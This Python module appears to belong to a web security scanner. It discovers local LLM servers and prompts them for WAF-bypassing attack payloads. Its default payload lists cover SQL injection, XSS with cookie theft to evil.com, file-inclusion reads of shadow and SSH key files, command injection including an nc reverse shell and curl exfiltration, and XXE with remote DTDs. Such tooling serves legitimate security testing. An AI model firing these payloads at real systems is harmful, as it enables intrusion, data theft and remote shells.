#!/usr/bin/env python3
"""
LLM Manager
==========

Intelligent management of Large Language Models including:
- Automatic detection of local LLM models (Ollama, LM Studio, etc.)
- Optimized integration with various LLM providers
- Payload generation and evaluation strategies
- Fallback mechanisms and error handling
"""

import os
import json
import time
import subprocess
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import logging
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

# Optional requests import for HTTP operations
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    logger.warning("requests not available - HTTP-based LLM operations will be limited")

class LLMProvider(Enum):
    """Supported LLM providers"""
    GEMINI = "gemini"
    OLLAMA = "ollama"
    LM_STUDIO = "lm_studio"
    OPENAI = "openai"
    LOCAL_API = "local_api"

@dataclass
class LLMModel:
    """LLM model information"""
    name: str
    provider: LLMProvider
    base_url: str
    api_key: str = ""
    context_window: int = 4096
    max_tokens: int = 1000
    is_available: bool = False
    last_checked: float = 0
    capabilities: List[str] = None

    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = []

class LLMManager:
    """Intelligent LLM management and payload generation"""

    def __init__(self):
        self.models: Dict[str, LLMModel] = {}
        self.executor = ThreadPoolExecutor(max_workers=3)
        self._detection_lock = threading.Lock()
        self._last_detection = 0
        self._detection_interval = 300  # 5 minutes
        self._ollama_base_url = os.environ.get('OLLAMA_BASE_URL', 'http://localhost:11434')

    def detect_local_models(self) -> Dict[str, LLMModel]:
        """Automatically detect all available local LLM models"""
        logger.info("Starting automatic LLM model detection...")

        with self._detection_lock:
            # Check if detection was done recently
            if time.time() - self._last_detection < self._detection_interval:
                logger.info("Using cached model detection results")
                return {name: model for name, model in self.models.items()
                       if model.is_available}

            self.models.clear()

            # Detect Ollama models (downloaded + availability)
            self._detect_ollama_models()
            # Fallback to CLI enumeration to ensure listing of downloaded models
            self._detect_ollama_models_cli()

            # Detect LM Studio models
            self._detect_lm_studio_models()

            # Detect other local API servers
            self._detect_local_api_servers()

            # Update detection timestamp
            self._last_detection = time.time()

            available_models = {name: model for name, model in self.models.items()
                              if model.is_available}

            logger.info(f"Model detection completed. Found {len(available_models)} available models")
            return available_models

    def list_models(self, provider: Optional[LLMProvider] = None, only_available: bool = False) -> List[LLMModel]:
        """Return models in deterministic order (provider, name)."""
        # Ensure cache is warmed
        _ = self.detect_local_models()
        models = list(self.models.values())
        if provider:
            models = [m for m in models if m.provider == provider]
        if only_available:
            models = [m for m in models if m.is_available]
        # Deterministic ordering
        models.sort(key=lambda m: (m.provider.value, m.name.lower()))
        return models

    def complete_text(self, prompt: str, model_name: Optional[str] = None, max_tokens: int = 800) -> str:
        """General-purpose text completion using available local models."""
        if not REQUESTS_AVAILABLE:
            return ""

        available_models = self.detect_local_models()
        if not available_models:
            return ""

        for key, model in available_models.items():
            if model_name and key != model_name:
                continue
            try:
                if model.provider == LLMProvider.OLLAMA:
                    resp = requests.post(
                        f"{model.base_url}/api/generate",
                        json={
                            'model': model.name,
                            'prompt': prompt,
                            'stream': False,
                            'options': {
                                'temperature': 0.3,
                                'top_p': 0.9
                            }
                        }, timeout=30
                    )
                    if resp.status_code == 200:
                        return resp.json().get('response', '')
                elif model.provider == LLMProvider.LM_STUDIO:
                    resp = requests.post(
                        f"{model.base_url}/v1/completions",
                        json={
                            'model': model.name,
                            'prompt': prompt,
                            'max_tokens': max_tokens,
                            'temperature': 0.3,
                            'top_p': 0.9
                        }, timeout=30
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        return data.get('choices', [{}])[0].get('text', '')
                elif model.provider == LLMProvider.LOCAL_API:
                    resp = requests.post(
                        f"{model.base_url}/v1/completions",
                        json={
                            'prompt': prompt,
                            'max_tokens': max_tokens,
                            'temperature': 0.3
                        }, timeout=30
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        return data.get('text', data.get('response', ''))
            except Exception:
                continue

        return ""

    def complete_json(self, prompt: str, model_name: Optional[str] = None, max_tokens: int = 800) -> Optional[Any]:
        """Request a JSON plan from the model and parse it safely."""
        json_prompt = (
            "You are a security testing planner. "
            "Respond ONLY with a JSON array of actions. Each action must be an object with: "
            "url (string), method (GET|POST), params (array of strings), vulnerabilities (array of strings), headers (object).\n\n"
            f"Context:\n{prompt}\n\nReturn ONLY valid JSON without explanation."
        )
        text = self.complete_text(json_prompt, model_name=model_name, max_tokens=max_tokens)
        if not text:
            return None
        try:
            # Extract JSON if surrounded by text
            start = text.find('{')
            start_arr = text.find('[')
            if start == -1 or (start_arr != -1 and start_arr < start):
                start = start_arr
            end = text.rfind(']')
            end_obj = text.rfind('}')
            if end_obj != -1 and (end == -1 or end_obj > end):
                end = end_obj
            if start != -1 and end != -1 and end > start:
                snippet = text[start:end+1]
            else:
                snippet = text
            return json.loads(snippet)
        except Exception:
            return None

    def _detect_ollama_models(self) -> None:
        """Detect Ollama models"""
        if not REQUESTS_AVAILABLE:
            logger.warning("Cannot detect Ollama models - requests not available")
            return

        try:
            # Check if Ollama is running
            response = requests.get(f'{self._ollama_base_url}/api/tags', timeout=5)
            if response.status_code == 200:
                models_data = response.json()
                count_before = len(self.models)
                for model in models_data.get('models', []):
                    model_name = model.get('name', '')
                    if model_name:
                        key = f"ollama/{model_name}"
                        self.models[key] = LLMModel(
                            name=model_name,
                            provider=LLMProvider.OLLAMA,
                            base_url=self._ollama_base_url,
                            is_available=True,
                            last_checked=time.time(),
                            capabilities=['payload_generation', 'code_analysis', 'text_generation']
                        )
                logger.info(f"Detected {len(self.models) - count_before} Ollama models via API")
        except Exception as e:
            logger.warning(f"Ollama detection failed: {e}")

    def _detect_ollama_models_cli(self) -> None:
        """Detect locally downloaded Ollama models via CLI to ensure complete listing."""
        try:
            result = subprocess.run(['ollama', 'list'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0 or not result.stdout.strip():
                return
            lines = [line for line in result.stdout.strip().split('\n') if line.strip()]
            # Skip header if present (e.g., 'NAME  ID  SIZE  MODIFIED')
            if lines and ('NAME' in lines[0] and 'SIZE' in lines[0]):
                lines = lines[1:]
            for line in lines:
                parts = line.split()
                if not parts:
                    continue
                model_name = parts[0]
                key = f"ollama/{model_name}"
                # Preserve availability if already detected via API
                existing = self.models.get(key)
                is_available = existing.is_available if existing else False
                base_url = existing.base_url if existing else self._ollama_base_url
                self.models[key] = LLMModel(
                    name=model_name,
                    provider=LLMProvider.OLLAMA,
                    base_url=base_url,
                    is_available=is_available,
                    last_checked=time.time(),
                    capabilities=['payload_generation', 'code_analysis', 'text_generation']
                )
            # Ensure deterministic ordering by recreating dict in sorted order
            self.models = {k: self.models[k] for k in sorted(self.models.keys(), key=lambda x: (self.models[x].provider.value, self.models[x].name.lower()))}
        except Exception as e:
            logger.debug(f"Ollama CLI detection skipped: {e}")

    def _detect_lm_studio_models(self) -> None:
        """Detect LM Studio models"""
        if not REQUESTS_AVAILABLE:
            logger.warning("Cannot detect LM Studio models - requests not available")
            return

        common_ports = [1234, 5000, 8000, 8080]

        for port in common_ports:
            try:
                # Try to detect LM Studio API
                response = requests.get(f'http://localhost:{port}/v1/models', timeout=3)
                if response.status_code == 200:
                    models_data = response.json()
                    for model in models_data.get('data', []):
                        model_id = model.get('id', '')
                        if model_id:
                            self.models[f"lm_studio/{model_id}"] = LLMModel(
                                name=model_id,
                                provider=LLMProvider.LM_STUDIO,
                                base_url=f'http://localhost:{port}',
                                is_available=True,
                                last_checked=time.time(),
                                capabilities=['payload_generation', 'chat', 'completion']
                            )
                    logger.info(f"Detected LM Studio models on port {port}")
                    break  # Found one, no need to check other ports
            except Exception:
                continue  # Try next port

    def _detect_local_api_servers(self) -> None:
        """Detect other local API servers"""
        if not REQUESTS_AVAILABLE:
            logger.warning("Cannot detect local API servers - requests not available")
            return

        common_ports = [8001, 8081, 5001]

        for port in common_ports:
            try:
                # Generic API detection
                response = requests.get(f'http://localhost:{port}/health', timeout=3)
                if response.status_code == 200:
                    # Try to get model info
                    try:
                        model_response = requests.get(f'http://localhost:{port}/v1/models', timeout=3)
                        if model_response.status_code == 200:
                            models_data = model_response.json()
                            for model in models_data.get('data', []):
                                model_id = model.get('id', 'unknown')
                                self.models[f"local_api/{model_id}"] = LLMModel(
                                    name=model_id,
                                    provider=LLMProvider.LOCAL_API,
                                    base_url=f'http://localhost:{port}',
                                    is_available=True,
                                    last_checked=time.time(),
                                    capabilities=['text_generation']
                                )
                    except Exception:
                        # Fallback for servers without model endpoint
                        self.models[f"local_api/generic_{port}"] = LLMModel(
                            name=f"Generic API (port {port})",
                            provider=LLMProvider.LOCAL_API,
                            base_url=f'http://localhost:{port}',
                            is_available=True,
                            last_checked=time.time(),
                            capabilities=['text_generation']
                        )
            except Exception:
                continue

    def generate_payloads(self, vulnerability_type: str, target_url: str,
                         context: str = "", model_name: Optional[str] = None) -> List[str]:
        """Generate sophisticated payloads using available LLMs"""
        payloads = []

        # Try to get available models
        available_models = self.detect_local_models()

        if not available_models:
            logger.warning("No local models available, falling back to default payloads")
            return self._get_default_payloads(vulnerability_type)

        # Try each available model
        for model_key, model in available_models.items():
            if model_name and model_key != model_name:
                continue

            try:
                if model.provider == LLMProvider.OLLAMA:
                    payloads = self._generate_ollama_payloads(model, vulnerability_type, target_url, context)
                elif model.provider == LLMProvider.LM_STUDIO:
                    payloads = self._generate_lm_studio_payloads(model, vulnerability_type, target_url, context)
                elif model.provider == LLMProvider.LOCAL_API:
                    payloads = self._generate_local_api_payloads(model, vulnerability_type, target_url, context)

                if payloads:
                    logger.info(f"Successfully generated {len(payloads)} payloads using {model_key}")
                    break

            except Exception as e:
                logger.warning(f"Failed to generate payloads with {model_key}: {e}")
                continue

        # Fallback to defaults if no payloads generated
        if not payloads:
            logger.warning("All LLM providers failed, using default payloads")
            payloads = self._get_default_payloads(vulnerability_type)

        return payloads[:10]  # Limit to 10 payloads

    def _generate_ollama_payloads(self, model: LLMModel, vulnerability_type: str,
                                target_url: str, context: str) -> List[str]:
        """Generate payloads using Ollama"""
        if not REQUESTS_AVAILABLE:
            return self._get_default_payloads(vulnerability_type)

        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/api/generate',
                               json={
                                   'model': model.name,
                                   'prompt': prompt,
                                   'stream': False,
                                   'options': {
                                       'temperature': 0.7,
                                       'top_p': 0.9
                                   }
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            payloads = [p.strip() for p in result['response'].split('\n') if p.strip()]
            return payloads

        return self._get_default_payloads(vulnerability_type)

    def _generate_lm_studio_payloads(self, model: LLMModel, vulnerability_type: str,
                                   target_url: str, context: str) -> List[str]:
        """Generate payloads using LM Studio"""
        if not REQUESTS_AVAILABLE:
            return self._get_default_payloads(vulnerability_type)

        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/v1/completions',
                               json={
                                   'model': model.name,
                                   'prompt': prompt,
                                   'max_tokens': 500,
                                   'temperature': 0.7,
                                   'top_p': 0.9
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            generated_text = result['choices'][0]['text']
            payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
            return payloads

        return self._get_default_payloads(vulnerability_type)

    def _generate_local_api_payloads(self, model: LLMModel, vulnerability_type: str,
                                   target_url: str, context: str) -> List[str]:
        """Generate payloads using generic local API"""
        if not REQUESTS_AVAILABLE:
            return self._get_default_payloads(vulnerability_type)

        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/v1/completions',
                               json={
                                   'prompt': prompt,
                                   'max_tokens': 500,
                                   'temperature': 0.7
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            generated_text = result.get('text', result.get('response', ''))
            payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
            return payloads

        return self._get_default_payloads(vulnerability_type)

    def _create_payload_prompt(self, vulnerability_type: str, target_url: str, context: str) -> str:
        """Create intelligent prompt for payload generation"""
        return f"""Generate 10 sophisticated {vulnerability_type} payloads for testing the URL: {target_url}

Context: {context}

Requirements:
1. Include both basic and advanced payloads
2. Consider different encoding methods (URL, HTML, Unicode, Base64, etc.)
3. Include bypass techniques for common security filters (WAF, input validation)
4. Make payloads context-aware and specific to the vulnerability type
5. Include payloads that test for different scenarios and edge cases
6. Consider the target technology stack and common vulnerabilities
7. Include time-based and boolean-based payloads where applicable
8. Ensure payloads are properly formatted and escaped

Return only the payloads, one per line, without explanations or numbering:
"""

    def _get_default_payloads(self, vulnerability_type: str) -> List[str]:
        """Default payloads for different vulnerability types"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--",
                "' UNION SELECT database(),user(),version()--",
                "' AND 1=0 UNION SELECT schema_name FROM information_schema.schemata--",
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<script>window.location='javascript:alert(1)'</script>",
                "<input onfocus=alert(1) autofocus>",
                "<div onmouseover=\"alert('XSS')\">Hover me</div>",
                "<style>body{ background-image: url('javascript:alert(1)') }</style>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd",
                "../../../etc/shadow",
                "../../../var/log/apache2/access.log",
                "../../../home/user/.ssh/id_rsa",
                "php://input",
                "zip://shell.php%23payload",
                "phar://test.phar/test.txt"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)",
                "; ping -c 4 127.0.0.1",
                "& timeout 10",
                "; sleep 5",
                "| base64 -d",
                "; echo 'test' > /tmp/test",
                "$(cat /etc/passwd)",
                "; id; uname -a; date",
                "& whoami && echo 'success'"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % payload SYSTEM "file:///etc/passwd"> %payload;]>',
                '<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">&#x25; file;]><root>&file;</root>',
                '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/malicious.xml"> %remote;]>'
            ]
        }
        return payloads.get(vulnerability_type, [])

    def get_model_info(self, model_name: str) -> Optional[LLMModel]:
        """Get information about a specific model"""
        return self.models.get(model_name)

    def test_model_availability(self, model: LLMModel) -> bool:
        """Test if a model is currently available"""
        try:
            if model.provider == LLMProvider.OLLAMA:
                response = requests.get(f'{model.base_url}/api/tags', timeout=5)
                model.is_available = response.status_code == 200
            elif model.provider == LLMProvider.LM_STUDIO:
                response = requests.get(f'{model.base_url}/v1/models', timeout=5)
                model.is_available = response.status_code == 200
            else:
                response = requests.get(f'{model.base_url}/health', timeout=5)
                model.is_available = response.status_code == 200

            model.last_checked = time.time()
            return model.is_available

        except Exception as e:
            logger.warning(f"Model {model.name} availability test failed: {e}")
            model.is_available = False
            model.last_checked = time.time()
            return False

    def cleanup(self):
        """Cleanup resources"""
        self.executor.shutdown(wait=True)

# Global LLM manager instance
llm_manager = LLMManager()